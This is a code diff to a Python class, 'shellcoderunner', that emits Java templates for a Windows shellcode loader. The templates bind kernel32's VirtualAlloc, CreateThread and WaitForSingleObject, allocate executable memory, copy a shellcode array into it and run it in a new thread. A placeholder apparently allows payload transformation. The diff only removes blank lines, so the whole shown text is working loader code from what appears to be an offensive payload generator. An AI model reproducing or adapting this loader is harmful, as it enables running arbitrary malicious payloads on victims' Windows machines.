@@ -20,38 +20,23 @@ class shellcoderunner:
 
     def codeblocks(self) -> str:
         return """
-
     private static final Linker LINKER = Linker.nativeLinker();
-
     private static final MemoryLayout C_INT     = LINKER.canonicalLayouts().get("int");
     private static final MemoryLayout C_LONG_LONG     = LINKER.canonicalLayouts().get("long long");
     private static final MemoryLayout C_POINTER = LINKER.canonicalLayouts().get("void*");
-
     public static Arena arena = Arena.ofConfined();
-
     public static SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32.dll", arena);
-
     public static MethodHandle VirtualAlloc = LINKER.downcallHandle(kernel32.find("VirtualAlloc").orElseThrow(),FunctionDescriptor.of(C_POINTER, C_POINTER, C_LONG_LONG, C_INT, C_INT));
-
     public static MethodHandle CreateThread = LINKER.downcallHandle(kernel32.find("CreateThread").orElseThrow(),FunctionDescriptor.of(C_LONG_LONG, C_POINTER, C_LONG_LONG, C_POINTER, C_POINTER, C_INT, C_POINTER));
-
     public static MethodHandle WaitForSingleObject = LINKER.downcallHandle(kernel32.find("WaitForSingleObject").orElseThrow(),FunctionDescriptor.of(C_INT, C_LONG_LONG, C_INT));
-
 """
 
     def template(self) -> str:
         return """
         {transformers}
-
         MemorySegment address = (MemorySegment) VirtualAlloc.invokeExact(MemorySegment.NULL, (long)shellcode.length, 0x3000, 0x40);
-
         address = address.reinterpret(shellcode.length);
-
         MemorySegment.copy(MemorySegment.ofArray(shellcode), 0, address, 0, shellcode.length);
-
         long hThread = (long) CreateThread.invokeExact(MemorySegment.NULL, (long)0, address, MemorySegment.NULL, 0, MemorySegment.NULL);
-
         int result = (int) WaitForSingleObject.invokeExact(hThread, -1);
-        
-        return;
 """
